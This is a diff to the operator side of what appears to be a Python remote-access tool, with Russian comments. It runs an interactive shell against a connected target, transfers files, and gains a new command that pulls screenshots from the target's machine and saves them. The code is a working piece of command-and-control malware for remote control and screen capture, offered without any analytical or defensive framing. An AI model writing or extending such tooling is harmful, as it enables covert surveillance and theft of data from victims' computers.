@@ -42,8 +42,18 @@ def upload_file(command, target):
         logging.error(f"Файл {file_name} не найден")
         reliable_send("[!!] Файл не найден", target)
 
+def save_screenshot(target, screenshot_id):
+     try:
+        with open(f"screenshot_{screenshot_id}.png", "wb") as screen_file:
+                image = reliable_recv(target)
+                image_data = base64.b64decode(image)
+                screen_file.write(image_data)
+        logging.info(f"Скриншот сохранен как screenshot_{screenshot_id}.png")
+     except Exception as e:
+        logging.error(f"Ошибка сохранения скриншота: {e}")
 # Работа с удаленной оболочкой
 def shell(target, ip):
+    screenshot_id = 1
     while True:
         try:
             command = input(f"*Shell#~{ip}: ")
@@ -57,9 +67,11 @@ def shell(target, ip):
                 download_file(command, target)
             elif command.startswith("upload"):
                 upload_file(command, target)
+            elif command.startswith("screenshot"):
+                save_screenshot(target, screenshot_id)
+                screenshot_id += 1
             else:
-                response = reliable_recv(target)
-                print(response)
+                print(reliable_recv(target))
         except Exception as e:
             logging.error(f"Ошибка выполнения команды: {e}")
             break
